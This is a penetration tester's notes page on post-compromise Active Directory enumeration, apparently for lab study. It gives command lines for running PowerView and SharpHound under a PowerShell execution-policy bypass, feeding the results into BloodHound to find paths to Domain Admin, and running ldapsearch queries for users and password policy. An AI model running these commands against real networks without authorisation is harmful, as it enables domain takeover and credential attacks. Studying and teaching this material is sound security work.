# Post-Compromise Enumeration

- We compromised a user what can we do with it
- How can we get Domain Admin

## Powerview

- Get it from [here](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1) and put it in the compromised machine
- From a cmd in the target: `powershell -ep bypass` 
- Launch Powerview: `. .\powerview.ps1`
- Get info on the Domain Controller: `Get-NetDomain`
- Check policies: `Get-DomainPolicy`
- Policies in System Access: `(Get-DomainPolicy)."systemAccess"` (e.g.: we get info about password policy and minimum length so min size if we want to password spray)
- Info about the users `Get-NetUser`
- Get only usenames `Get-NetUser | select cn` (e.g.: will output Jessica Jones)
- Get only sam account name: `Get-NetUser | select samaccountname` (e.g.: will output jjones)
- Get only description: `Get-NetUser | select description` (e.g.: will output a description if provided by sysadmn or a default one)
- See all the properties a user have: `Get-UserProperty`
- Get more details for example password last set: `Get-UserProperty -Properties pwdlastset`
- Get more details for example logoncount: `Get-UserProperty -Properties logoncount`
- See if users have entered bad passwd: `Get-UserProperty -Properties badpwdcount`
- List all the computers in the Domain: `Get-NetComputer`
- Same but with much more info: `Get-NetComputer -FullData`
- Filter this load of data with specific info: `Get-NetComputer -FullData | select OperatingSystem`
- Get info on groups: `Get-NetGroup`
- Filter for a specific GroupName: `Get-NetGroup -GroupName "Domain Admins" `
- Filter on GroupName with a wildcard: `Get-NetGroup -GroupName *admin* `
- Get users from a specific group: `Get-NetGroup -GroupName "Domain Admins" `
- Get smb shared in the network: `Invoke-ShareFinder`
- Get group policies: `Get-NetGPO`
- Filter the info: `Get-NetGroup -GroupName "Domain Admins" `

### Powerview - Resources

- [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

## BloodHound

### Setup and Install

- Install: `sudo apt install bloodhound`
- Launch neo4j for Setup: `neo4j console`
- Open the link provided by neo4j, connect with default creds: `neo4j:neo4j` 
- Change the password
- From the console launch `bloodhound`
- Connect with the creds you just set up in neo4j

### Grabbing Data to feed Bloodhound

- Download and setup an injector for instance invoke-bloodhound for powershell, we can use [sharphound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
- Put Sharphound in your target machine
- From the cmd of your target run: `powershell -ep bypass`
- Run Sharphound: `. .\SharpHound.ps1`
- Now we can invoke-bloodhound to collect data: `Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.local -ZipFilename data.zip`
- Copy the zip file in your attacking machine
- Click on upload data and double click on the zip file
- In Analysis we can now click to Find all Domains
- We can also find the shortest path to the domain admins
- We want to find boxes where a domain admin is logged in.

## ldapsearch - cmd line

- `ldapsearch -x -h IP-ADRESS -b "dc=DOMAIN-NAME,dc=LOCAL"` will send back a lot of useful info including user enum. Very efficient when you can leverage anonymous bind

## ldapsearch-ad.py - Example of commands

- `python3 ldapsearch-ad.py -l TARGET-IP -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t all` You will have very detailed infos on the domain and you can event output it in a file with `-o filename`
- `python3 ldapsearch-ad.py -l TARGET-IP -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t search -s '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=262144))'` fin users with smartcard required for interactive logon 
- `python3 ldapsearch-ad.py -l TARGET-IP -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t pass-pols` You will get the password policy
- `python3 ldapsearch-ad.py -l 10.129.42.188 -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t search -s '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=128))'` user account has their userAccountControl value set to ENCRYPTED_TEXT_PWD_ALLOWED

## Other tools

- [ldapsearch-ad.py - yaap7](https://github.com/yaap7/ldapsearch-ad)

## Resources

- [List of AD property flags for ldap queries](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#list-of-property-flags)
